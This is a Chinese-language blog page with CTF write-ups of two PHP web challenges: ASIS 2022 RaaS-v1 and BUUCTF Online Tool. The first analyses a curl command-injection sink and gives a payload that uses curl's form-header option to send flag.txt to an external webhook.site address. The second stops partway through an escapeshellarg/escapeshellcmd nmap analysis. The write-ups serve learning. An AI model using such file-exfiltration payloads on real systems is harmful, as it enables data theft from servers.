<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Ex1Le23">





<title>é›†è®­WriteUp-1 | Stuuupid&#39;s Blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    
    <script src="/js/jquery.min.js"></script>
    



    
    
        <!-- MathJaxé…ç½®ï¼Œå¯é€šè¿‡å•ç¾å…ƒç¬¦å·ä¹¦å†™è¡Œå†…å…¬å¼ç­‰ -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- ç»™MathJaxå…ƒç´ æ·»åŠ has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- é€šè¿‡è¿æ¥CDNåŠ è½½MathJaxçš„jsä»£ç  -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    





    <script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>

<script>
    function pjax_fancybox() {
      $(".post-content").find("img").not('.inline').not('a img').each(function () { //æ¸²æŸ“ fancybox
        var element = document.createElement("a"); // a æ ‡ç­¾
        $(element).attr("pjax-fancybox", "");  // è¿‡æ»¤ pjax
        $(element).attr("href", $(this).attr("src"));
        // console.log($(this));
        if ($(this).attr("data-original")) {
          $(element).attr("href", $(this).attr("data-original"));
        }
        $(element).attr("data-fancybox", "images");
        var caption = "";   // æè¿°ä¿¡æ¯
        if ($(this).attr('alt')) {  // åˆ¤æ–­å½“å‰é¡µé¢æ˜¯å¦å­˜åœ¨æè¿°ä¿¡æ¯
          $(element).attr('data-caption', $(this).attr('alt'));
          caption = $(this).attr('alt');
        }
        var div = document.createElement("div");
        $(div).addClass("fancybox");
        $(this).wrap(div); // æœ€å¤–å±‚å¥— div ï¼Œå…¶å®ä¸»è¦ä½œç”¨è¿˜æ˜¯ class æ ·å¼
        // var span = document.createElement("span");
        // $(span).addClass("image-caption");
        // $(span).text(caption); // åŠ æè¿°
        // $(this).after(span);  // å†å¥—ä¸€å±‚æè¿°
        $(this).wrap(element);  // æœ€åå¥— a æ ‡ç­¾
      })
      $(".post-content").find("img").fancybox({
        selector: '[data-fancybox="images"]',
        hash: false,
        loop: false,
        closeClick: true,
        helpers: {
          overlay: {closeClick: true}
        },
        buttons: [
          "zoom",
          "close"
        ]
      });
    };
    $(function () {
      pjax_fancybox();
    });
  </script>





    <script>
    function searchToggle() {
        const width = $(document.body).width()
        if(width > 479) {
            return;
        }
        const search = $('.search');
        const searchForm = $('.form-search');
        const menuToggle = $('.menu-toggle');
        const title = $('.navbar-header-title ');

        if(!search.hasClass("mobile-search")) {
            search.addClass("mobile-search");
            menuToggle.addClass("open-search")
            title.addClass("mobile-title-hidden")
        } else {
            search.removeClass("mobile-search");
            menuToggle.removeClass("open-search")
            // title.css({visibility: 'visible'})
            title.removeClass("mobile-title-hidden")
        } 

       
    }

    function inputChange(e) {
        const value = e.target.value;
        const pc = $('#pc-search-input');
        const mobile = $('#mobile-search-input');
        const modalInput = $('#modal-form-input');
        // å…¶ä¸­ä¸€ä¸ªæœç´¢æ¡†ä¿®æ”¹è¦æ›´æ”¹å¦å¤–ä¸¤ä¸ªæœç´¢æ¡†
        const inputArray = [pc, mobile, modalInput];
        // modalInput.val("fuck")
        for(let i = 0; i < inputArray.length; i++) {
            if(e.target === inputArray[i][0]) {
                continue;
            }
            inputArray[i].val(value);
        }
        
    }

    function search(searchInputEl, formEl, flag) {
        const path = "/" + "search.json";
        $(formEl).submit(function(e){
            if(e && e.preventDefault){
                e.preventDefault();
            }else{
                window.event.returnValue = false;
            }
            
            const modalInput = $('#modal-form-input');
         
            if(!flag && modalInput.val() === '') {
                return ;
            }

            $("#u-search").fadeIn(500, function() {
                $("body > .wrapper").addClass("modal-active");
                $(".form-input").focus();
                $.ajax({
                    url: path,
                    dataType: "json",
                    beforeSend: function (xhr) {
                        const loadingBar = $('.search-loading-bar') 
                        loadingBar.css({
                            width:'100%',
                            visibility: 'visible'
                        });
                    },
                    success: function( datas ) {
                        const $resultPanel = $(".modal-body")[0];
                        let str = `<ul class="modal-results">`;
                        var keywords = $(".form-input").val().trim().toLowerCase().split(/[\s\-]+/);
                        $resultPanel.innerHTML = "";
                        let hasResult = false
                        let text = `<div class="no-result">æ‰¾ä¸åˆ°ä¸å…³é”®è¯ç›¸å…³çš„å†…å®¹....</div>`;

                        if ($(".form-input").val().trim().length <= 0) {
                            // æ²¡æœ‰ç»“æœ
                            $resultPanel.innerHTML = text;
                            return;
                        }
                        datas.forEach(function (data) {
                            var isMatch = true;
                            var data_title = data.title && data.title.trim().toLowerCase() || 'Untitled';
                            var data_content = data.content && data.content.trim().replace(/<[^>]+>/g, "").toLowerCase() || '';
                            var data_url = data.url;
                            var index_title = -1;
                            var index_content = -1;
                            var first_occur = -1;
                            if (data_content !== '') {
                                keywords.forEach(function (keyword, i) {
                                    index_title = data_title.indexOf(keyword);
                                    index_content = data_content.indexOf(keyword);

                                    if (index_title < 0 && index_content < 0) {
                                        isMatch = false;
                                    } else {
                                        hasResult = true
                                        if (index_content < 0) {
                                            index_content = 0;
                                        }
                                        if (i == 0) {
                                            first_occur = index_content;
                                        }
                                    }
                                });
                            } else {
                                isMatch = false;
                            }
                            // show search results
                            if (isMatch) {
                                str += `<li class='result-item'><a href='${data_url}' class='result-item-detail'> <span class="title">${data_title}</span>`;
                                var content = data.content.trim().replace(/<[^>]+>/g, "");
                                if (first_occur >= 0) {
                                    // cut out 200 characters
                                    var start = first_occur - 40;
                                    var end = first_occur + 160;

                                    if (start < 0) {
                                        start = 0;
                                    }

                                    if (start == 0) {
                                        end = 200;
                                    }

                                    if (end > content.length) {
                                        end = content.length;
                                    }

                                    var match_content = content.substring(start, end);

                                    // highlight all keywords
                                    keywords.forEach(function (keyword) {
                                        var regS = new RegExp(keyword, "gi");
                                        match_content = match_content.replace(regS, `<em class="search-keyword">${keyword}</em>`);
                                    });

                                    str += `<span class="content"> ${match_content} ...</span></a>`;
                                }
                                str += "</li>";
                            }
                        });
                        str += "</ul>";
                        if(hasResult) {
                            $resultPanel.innerHTML = str;
                        } else {
                            $resultPanel.innerHTML = text;
                        }

                    },
                    complete: function() {
                        setTimeout(() => {
                            const loadingBar = $('.search-loading-bar') 
                            loadingBar.css({
                                visibility: 'hidden',
                            });
                        }, 300)
                    }
                });
            })
        
        });
    }
    
    $(document).ready(function() {
        $('.modal-close').click(function () { 
            $("#u-search").fadeOut();
            $("body > .wrapper").removeClass("modal-active")
        })

        $('.modal-overlay').click(function() {
            $("#u-search").fadeOut();
            $("body > .wrapper").removeClass("modal-active")
        })
        search(null, ".form-search", false)
        search("#u-search-modal-form .form-input", ".u-search-modal-form", true)
    })
</script>


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Stuuupid&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                
    <div class="search ">
        <div class="search-btn" onClick="searchToggle()">
            <img src="/image/search.png" class="search-btn-img" />
        </div>
        <form class="form-search">
            <input class="input" placeholder="æœç´¢æ–‡ç« ï¼Œå›è½¦æœç´¢" autocomplete="off" onchange="inputChange(event)" id="pc-search-input"/>
        </form>
    </div>



                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div class="navbar-header-title">
                    <a href="/">Stuuupid&#39;s Blog</a><a id="mobile-toggle-theme">Â·&nbsp;Light</a>
                </div>
                <div class="navbar-mobile-right">
                    
                    
    <div class="search ">
        <div class="search-btn" onClick="searchToggle()">
            <img src="/image/search.png" class="search-btn-img" />
        </div>
        <form class="form-search">
            <input class="input" placeholder="æœç´¢æ–‡ç« ï¼Œå›è½¦æœç´¢" autocomplete="off" onchange="inputChange(event)" id="mobile-search-input"/>
        </form>
    </div>



                    <div class="menu-toggle" onclick="mobileBtn()">&#9776; ç›®å½•</div>
                </div>
                
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
            toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">é›†è®­WriteUp-1</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Ex1Le23</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">January 4, 2023&nbsp;&nbsp;17:46:14</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/Wp-web/">Wp-web</a>
                            
                        </span>
                    
                    
                        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


<span class="site-pv">
    æ€»è®¿é—®é‡:
    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
</span>

                    
                </div>
            
        </header>

        <div class="post-content">
            <p>2023-01-04 WP</p>
<h1 id="T1-ASIS-ctf-final-2022-RaaS-v1"><a href="#T1-ASIS-ctf-final-2022-RaaS-v1" class="headerlink" title="T1 [ASIS ctf final 2022]RaaS-v1"></a>T1 [ASIS ctf final 2022]RaaS-v1</h1><p>é¢˜ç›®æç¤º<code>curl</code>å’Œ<code>read the docs</code>ï¼Œå¹¶ç»™å‡ºäº†äºŒè¿›åˆ¶æºç ï¼Œç”¨010 Editoræˆ–å…¶ä»–ç¼–è¾‘å™¨æ‰“å¼€ï¼Œå¾—åˆ°å¦‚ä¸‹æºç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if($_SERVER[&#x27;REMOTE_ADDR&#x27;] == &#x27;127.0.0.1&#x27;)&#123;     </span><br><span class="line">	die(&#x27;curl :thonk:&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = &#x27;http://localhost&#x27;;</span><br><span class="line">$method = &#x27;GET&#x27;;</span><br><span class="line">$formParams = [];</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;                        </span><br><span class="line">	$url = $_GET[&#x27;url&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;method&#x27;]))&#123;</span><br><span class="line">	$method = $_GET[&#x27;method&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;formParams&#x27;]))&#123;                 </span><br><span class="line">	$formParams = $_GET[&#x27;formParams&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cmd = &#x27;curl &#x27;;</span><br><span class="line">$cmd .= &#x27;--proto -file &#x27;; </span><br><span class="line">$cmd .= escapeshellarg($url).&#x27; &#x27;;</span><br><span class="line">$cmd .= &#x27;-X &#x27;;</span><br><span class="line">$cmd .= escapeshellarg($method).&#x27; &#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($formParams as $key =&gt; $value)&#123;</span><br><span class="line">	if(preg_match(&quot;/^\w+$/&quot;,$key))&#123;</span><br><span class="line">		$cmd .= &#x27;-F &#x27;;</span><br><span class="line">		$cmd .= escapeshellarg($key.&#x27;= &#x27;.$value);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(&#x27;Content-Type: text/plain&#x27;);</span><br><span class="line">system($cmd);</span><br></pre></td></tr></table></figure>

<p>å¹¶ä¸”åœ¨æºç ä¸­å¯ä»¥å‘ç°<code>raas-v1/flag.txt</code>ï¼ŒçŒœæµ‹è¿™é¢˜è¦æˆ‘ä»¬åˆ©ç”¨<code>curlå‘½ä»¤</code>è¯»å–æ–‡ä»¶ï¼Œè·å–flag.</p>
<h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p>ä»£ç ç¬¬ä¸€è¡Œçš„ <code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code> èƒ½è·å–<strong>æ­£åœ¨æµè§ˆå½“å‰é¡µé¢ç”¨æˆ·çš„ IP åœ°å€</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($_SERVER[&#x27;REMOTE_ADDR&#x27;] == &#x27;127.0.0.1&#x27;)&#123;     </span><br><span class="line">	die(&#x27;curl :thonk:&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è§„å®šäº†ä¸èƒ½ç”¨æœ¬åœ°è®¿é—®è¯¥é¡µé¢ã€‚è¿™ä¸€ç‚¹å®¹æ˜“è§£å†³ï¼Œåªéœ€è¦ä¼ å…¥URLå‚æ•°ï¼Œä¸è®©ä»–è‡ªå·±curlè¿æ¥è‡ªå·±å°±å¥½ã€‚<br>æ¥ä¸‹æ¥æ˜¯å‡ ä¸ªå‚æ•°çš„æäº¤ï¼Œæœ€ç»ˆä¼šè¢«æ‹¼æ¥ä¸º:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd = curl --proto -file $url -X $method -F $key= $value</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­ <code>$url</code> <code>$method</code> <code>$key.&#39;= &#39;.$value</code> éƒ½ä¼šç”±<code>escapeshellarg()</code>å¤„ç†ã€‚</p>
<blockquote>
<p>escapeshellarg() å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚</p>
</blockquote>
<p>èŠ±äº†å¾ˆé•¿æ—¶é—´ç ”ç©¶<code>escapeshellarg()</code>çš„ç»•è¿‡ï¼Œå¹¶è¯•å›¾åˆ©ç”¨åœ¨è¿™é“é¢˜ä¸Šï¼Œé—æ†¾çš„æ˜¯æ²¡æœ‰æˆåŠŸã€‚è½¬è€Œè¿›ä¸€æ­¥æŸ¥é˜…curlæ‰‹å†Œï¼Œæ‰¾åˆ°<code>-F</code>é€‰é¡¹:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-F, --form CONTENT  æ¨¡æ‹Ÿ HTTP è¡¨å•æ•°æ®æäº¤ï¼ˆmultipart POSTï¼‰</span><br></pre></td></tr></table></figure>

<p>è¯¥é€‰é¡¹å¯ä»¥ç”¨æ¥æäº¤è¡¨å•æ•°æ®ã€ä¸Šä¼ äºŒè¿›åˆ¶æ–‡ä»¶ç­‰ï¼Œå…¶ç”¨æ³•å¦‚ä¸‹:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ç¤ºä¾‹1 å°†å›¾åƒå‘é€åˆ°HTTPæœåŠ¡å™¨ï¼Œå…¶ä¸­â€œprofileâ€æ˜¯æ–‡ä»¶portrait.jpgå°†ä½œä¸ºè¾“å…¥çš„è¡¨å•å­—æ®µçš„åç§°ï¼š</span><br><span class="line">curl -F profile=@portrait.jpg https://example.com/upload.cgi</span><br><span class="line"></span><br><span class="line">ç¤ºä¾‹2 å°†æ‚¨çš„å§“åå’Œé‹ç å‘é€åˆ°ä¸¤ä¸ªæ–‡æœ¬å­—æ®µåˆ°æœåŠ¡å™¨ï¼š</span><br><span class="line">curl -F name=John -F shoesize=11 https://example.com/</span><br><span class="line"></span><br><span class="line">ç¤ºä¾‹3 å°†æ–‡æœ¬å­—æ®µä¸­çš„æ–‡ç« å‘é€åˆ°æœåŠ¡å™¨ã€‚å°†å…¶ä½œä¸ºçº¯æ–‡æœ¬å­—æ®µå‘é€ï¼Œä½†ä»æœ¬åœ°æ–‡ä»¶ä¸­è·å–å…¶å†…å®¹ï¼š</span><br><span class="line">curl -F &quot;story=&lt;hugefile.txt&quot; https://example.com/</span><br><span class="line"></span><br><span class="line">æ‚¨å¯ä»¥é€šè¿‡è®¾ç½® headers= å‘å­—æ®µæ·»åŠ è‡ªå®šä¹‰æ ‡é¢˜ï¼Œä¾‹å¦‚ï¼š</span><br><span class="line"> curl -F &quot;submit=OK;headers=\&quot;X-submit-type: OK\&quot;&quot; example.com</span><br><span class="line"> æˆ–</span><br><span class="line"> curl -F &quot;submit=OK;headers=@headerfile&quot; example.com</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥å›åˆ°<code>$cmd = curl --proto -file $url -X $method -F $key= $value</code>ï¼Œè¿™é‡Œ<code>--proto -file</code>å…³é—­äº†<code>file</code>åè®®ï¼Œä¹Ÿå°±æ— æ³•é€šè¿‡fileåè®®å»è®¿é—®æ–‡ä»¶ã€‚ä¸è¿‡æ²¡æœ‰å…³ç³»ï¼Œ<code>-F</code>é€‰é¡¹å‘Šè¯‰æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>curl -F å‚æ•°å=&lt;æ–‡ä»¶å</code>ä¸Šä¼ æ–‡ä»¶å†…å®¹åˆ°æœåŠ¡å™¨ï¼ˆæˆ–è€…<code>@æ–‡ä»¶å</code>ä¸Šä¼ æ–‡ä»¶ï¼‰ã€‚è€Œåœ¨è¿™é‡Œï¼Œè¿™ä¸ªåŠæ³•ä¹Ÿæ˜¯è¡Œä¸é€šçš„ï¼Œå› ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd .= escapeshellarg($key.&#x27;= &#x27;.$value);</span><br></pre></td></tr></table></figure>
<p>å¼ºè¡Œåœ¨ <code>=</code> å’Œ <code>$value</code> ä¹‹é—´åŠ äº†ä¸ªç©ºæ ¼ã€‚äºæ˜¯é€‰æ‹©åˆ©ç”¨ä¸Šè¿°ç»™åˆ°çš„æœ€åä¸€ä¸ª<code>-F</code>é€‰é¡¹çš„ç”¨ä¾‹ï¼Œé€šè¿‡<code>headers</code>å‚æ•°å°†æ–‡ä»¶å†…å®¹æäº¤åˆ°vpsï¼Œç„¶ååœ¨vpsç›‘å¬å³å¯ï¼ˆä¸çŸ¥ä¸ºä½•æˆ‘çš„vpså§‹ç»ˆç›‘å¬ä¸åˆ°ï¼Œçƒ¦æï¼‰ã€‚</p>
<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>æœ€ç»ˆpayloadå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cmd = curl --proto -file &quot;https://webhook.site/949a9a7a-852c-49ae-bf21-c0406b092ecf&quot; -X &quot;GET&quot; -F &quot;file= a;headers=@./flag.txt&quot;</span><br><span class="line"></span><br><span class="line">url=https://webhook.site/949a9a7a-852c-49ae-bf21-c0406b092ecf&amp;method=GET&amp;formParams[file]=a;headers=@./flag.txt</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å‚è€ƒä¸¹å­å“¥çš„wp: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/ccuu/articles/17023814.html">ä¸€ä¸ªcurlçš„ç»•è¿‡</a><br><br>å‚è€ƒcurlæ‰‹å†Œ: <a target="_blank" rel="noopener" href="https://curl.se/docs/manpage.html">curl.se</a><br><br>å‚è€ƒå°å§¿åŠ¿: <a target="_blank" rel="noopener" href="https://www.77169.net/html/196478.html">ç»•è¿‡é™åˆ¶åˆ©ç”¨curlè¯»å–å†™å…¥æ–‡ä»¶</a></p>
</blockquote>
<h1 id="T2-BUUCTF-2018-Online-Tool"><a href="#T2-BUUCTF-2018-Online-Tool" class="headerlink" title="T2 [BUUCTF 2018]Online Tool"></a>T2 [BUUCTF 2018]Online Tool</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[BUUCTF%202018]Online%20Tool">é¢˜ç›®åœ°å€</a></p>
<p>ä¸ºäº†é’ˆå¯¹<code>escapeshellarg()</code>å‡½æ•°çš„ç»•è¿‡è¿›è¡Œå­¦ä¹ ï¼Œè¿™é‡Œç›´æ¥å«–ä¸€é“ç›¸å…³çš„é¢˜æ¥åˆ†æã€‚æºç ç›´æ¥ç»™å‡ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;host&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $host = $_GET[&#x27;host&#x27;];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    echo &#x27;you are in sandbox &#x27;.$sandbox;</span><br><span class="line">    @mkdir($sandbox);                      // @ä¸ºé”™è¯¯æ§åˆ¶è¿ç®—ç¬¦ï¼Œé™„åŠ åˆ°è¡¨è¾¾å¼å‰é¢æ—¶ï¼Œä»»ä½•å¯èƒ½å‡ºç°çš„ç”±è¯¥è¡¨è¾¾å¼ç”Ÿæˆçš„è¯Šæ–­é”™è¯¯å°†è¢«æŠ‘åˆ¶</span><br><span class="line">    chdir($sandbox);                       // æ”¹å˜å½“å‰çš„ç›®å½•ä¸ºä¸Šä¸€æ­¥åˆ›å»ºçš„$sandbox</span><br><span class="line">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="è§£é¢˜æ€è·¯-1"><a href="#è§£é¢˜æ€è·¯-1" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p><code>$host</code>æ˜¯å¯æ§çš„ï¼Œä¾æ¬¡ç»è¿‡<code>escapeshellarg</code>å’Œ<code>escapeshellcmd</code>å¤„ç†ï¼Œç„¶åæ‹¼æ¥åˆ°nmapè¯­å¥ä¸­ï¼ŒçŒœæƒ³å¯ä»¥åˆ©ç”¨<code>nmap</code>è¯­æ³•å®ç°RCE. æŸ¥è¯¢Nmapæ‰‹å†Œï¼Œå…ˆå¯¹æºç ä¸­nmapè¯­å¥è¿›è¡Œè§£æï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F </span><br><span class="line"></span><br><span class="line">-T5: å³Insaneæ¨¡å¼ï¼Œé€‚åˆå¿«é€Ÿçš„ç½‘ç»œæˆ–è€…ä¸åœ¨æ„ä¸¢å¤±é»˜äº›ä¿¡æ¯,å¯¹æ¯å°ä¸»æœºçš„è¶…æ—¶é™åˆ¶ä¸º75ç§’,å¯¹æ¯æ¬¡æ¢æµ‹åªç­‰å¾…0.3ç§’</span><br><span class="line">-sT: TCPè¿æ¥æ‰«æ</span><br><span class="line">-Pn: æ— Pingæ‰«æ,å¯ä»¥èº²é¿é˜²ç«å¢™é˜²æŠ¤,å¯ä»¥åœ¨ç›®æ ‡ä¸»æœºç¦æ­¢pingçš„æƒ…å†µä¸‹ä½¿ç”¨</span><br><span class="line">-F : å¿«é€Ÿæ‰«æ</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰å‘ç°ä»€ä¹ˆå¯åˆ©ç”¨çš„ç‚¹ï¼Œä½†å¯æŸ¥çŸ¥nmapå¯ä»¥å°†è¾“å‡ºç»“æœå†™å…¥æ–‡ä»¶ï¼Œæ–‡ä»¶åå’Œæ–‡ä»¶ç±»å‹å‡å¯è‡ªå®šä¹‰</p>
